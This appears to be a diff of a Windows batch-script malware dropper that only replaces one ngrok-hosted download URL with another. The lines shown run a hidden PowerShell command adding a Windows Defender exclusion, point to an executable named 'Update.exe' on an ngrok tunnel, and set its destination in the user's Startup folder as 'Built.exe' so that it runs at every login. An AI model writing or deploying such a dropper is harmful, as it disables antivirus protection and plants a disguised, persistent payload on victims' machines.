@@ -3,7 +3,7 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://cf63-2a09-bac5-58af-d2d-00-150-bf.ngrok-free.app/Update.exe"
+set "URL=https://9ba2-2a09-bac1-72c0-8-00-150-67.ngrok-free.app/Update.exe"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
